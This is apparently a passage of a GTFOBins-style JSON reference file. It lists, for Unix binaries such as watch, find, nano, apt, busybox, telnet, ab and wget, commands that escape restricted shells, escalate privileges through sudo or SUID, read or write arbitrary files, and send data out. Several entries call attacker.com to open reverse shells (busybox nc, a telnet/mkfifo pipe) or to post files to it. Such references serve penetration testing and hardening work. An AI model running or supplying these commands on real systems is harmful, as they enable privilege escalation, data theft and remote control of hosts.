          "code": "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "watch": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./watch 'reset; exec sh 1>&0 2>&0'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "scanmem": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "scanmem\nshell /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./scanmem\nshell /bin/sh\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo scanmem\nshell /bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cpulimit": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "cpulimit -l 100 -f /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./cpulimit -l 100 -f -- /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo cpulimit -l 100 -f /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "w3m": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nw3m \"$LFILE\" -dump\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "wireshark": {
    "description": "",
    "functions": {
      "command": [
        {
          "code": "wireshark",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "check_by_ssh": {
    "description": "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n\nWhen `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios\nPlugins project in it's default configuration is used, it does not work anymore.\n\nIt does still work on previous versions from the Nagios Plugins project or\nall versions from the Monitoring Project (e.g. used by Ubuntu/Debian).\n",
    "functions": {
      "shell": [
        {
          "code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "file": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nfile -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_read\nfile -m $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./file -f $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo file -f $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "neofetch": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nneofetch --ascii $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "yelp": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nyelp \"man:$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ]
    }
  },
  "time": {
    "description": "Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path.",
    "functions": {
      "shell": [
        {
          "code": "/usr/bin/time /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./time /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo /usr/bin/time /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pexec": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pexec /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./pexec /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo pexec /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "as": {
    "description": "The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nas @$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./as @$LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo as @$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "apt": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "apt changelog apt\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo apt changelog apt\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "setarch": {
    "description": "The `uname -m` command can be used in place of `arch` to obtain the architecture.",
    "functions": {
      "shell": [
        {
          "code": "setarch $(arch) /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./setarch $(arch) /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo setarch $(arch) /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dnf": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo dnf install -y x-1.0-1.noarch.rpm\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "find": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "find . -exec /bin/sh \\; -quit",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./find . -exec /bin/sh -p \\; -quit",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo find . -exec /bin/sh \\; -quit",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nfind / -fprintf \"$FILE\" DATA -quit\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "aspell": {
    "description": "The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\naspell -c \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tail": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "puppet": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nano": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "nano\n^R^X\nreset; sh 1>&0 2>&0\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "nano -s /bin/sh\n/bin/sh\n^T\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "nano file_to_write\nDATA\n^O\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "nano file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "limited-suid": [
        {
          "code": "./nano -s /bin/sh\n/bin/sh\n^T\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./tex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "distcc": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "distcc /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./distcc /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo distcc /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "wc": {
    "description": "The file content is parsed as a sequence of `\\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nwc --files0-from \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "busybox": {
    "description": "BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.",
    "functions": {
      "shell": [
        {
          "code": "busybox sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "LPORT=12345\nbusybox httpd -f -p $LPORT -h .\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\n./busybox cat \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./busybox sh",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo busybox sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nbusybox nc -e /bin/sh $RHOST $RPORT\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ]
    }
  },
  "xdg-user-dir": {
    "description": "The current implementation of `xdg-user-dir` is basically `eval echo \\${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.\n",
    "functions": {
      "shell": [
        {
          "code": "xdg-user-dir '}; /bin/sh #'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo xdg-user-dir '}; /bin/sh #'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "flock": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "flock -u / /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./flock -u / /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo flock -u / /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "telnet": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "sudo": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ab": {
    "description": "",
    "functions": {
      "file-upload": [
        {
          "code": "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_download\nab -v2 $URL\n",
          "description": "It can download remote files."
        }
      ],
      "suid": [
        {
          "code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "highlight": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pdftex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./pdftex --shell-escape '\\write18{/bin/sh}\\end'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "wget": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nwget --use-askpass=$TF 0\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nwget -i $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-download": [
        {
          "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE\n",
          "description": "It can download remote files."
        }
      ],
      "suid": [
        {
          "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
